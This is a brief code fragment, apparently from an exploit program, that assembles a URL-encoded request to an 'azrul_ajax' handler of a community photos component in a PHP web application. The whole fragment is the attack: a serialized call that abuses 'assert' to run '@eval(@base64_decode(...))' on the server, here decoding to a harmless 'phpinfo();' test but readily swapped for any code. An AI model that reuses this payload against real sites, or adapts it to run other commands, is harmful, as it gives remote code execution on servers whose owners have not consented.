...
ex = "option=community&no_html=1&task=azrul_ajax&func=photos,ajaxUploadAvatar&" + token + "=1&arg2=[\"_d_\",\"Event\"]&arg3=[\"_d_\",\"374\"]&arg4=[\"_d_\",\"%7B%22" + "call%22%3A%5B%22CStringHelper%22%2C%22escape%22%2C%20%22%40exit%28%40" + "eval%28%40base64_decode%28%27cGhwaW5mbygpOw%3D%3D%27%29%29%29%3B%22%2C" + "%22assert%22%5D%7D\"]";
len = strlen( ex );
